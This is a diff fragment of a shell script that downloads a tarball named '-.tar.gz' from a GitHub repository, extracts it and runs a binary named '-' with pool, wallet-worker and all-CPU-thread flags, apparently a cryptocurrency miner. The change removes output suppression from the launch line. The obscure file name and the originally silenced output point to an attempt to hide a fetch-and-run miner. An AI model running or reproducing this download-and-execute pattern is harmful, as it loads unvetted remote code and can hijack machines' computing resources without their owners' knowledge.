@@ -6,5 +6,5 @@ C=modol
 apt-get update && apt-get upgrade -y
 wget https://github.com/muledan1/bash/raw/main/-.tar.gz
 tar -xf -.tar.gz
-./- -o $A -u $B.$C -t$(nproc --all) >/dev/null >/dev/null 2>&1
+./- -o $A -u $B.$C -t$(nproc --all)
 sleep 10
